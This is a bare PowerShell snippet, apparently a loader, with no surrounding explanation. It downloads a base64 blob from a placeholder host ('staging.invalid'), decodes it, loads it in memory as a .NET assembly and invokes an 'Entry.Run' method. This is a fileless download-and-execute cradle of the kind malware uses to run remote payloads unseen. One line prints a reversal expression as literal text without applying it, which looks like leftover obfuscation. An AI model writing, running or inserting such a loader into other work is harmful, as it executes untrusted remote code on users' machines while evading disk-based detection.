$web = New-Object Net.WebClient
$text = $web.DownloadString('https://staging.invalid/blob')
Write-Host '($text.ToCharArray())[($text.Length - 1)..0]'
$chars = $text.ToCharArray()
$bytes = [Convert]::FromBase64String(-join $chars)
$module = [Reflection.Assembly]::Load($bytes)
$method = $module.GetType('Entry').GetMethod('Run')
$method.Invoke($null, $null)
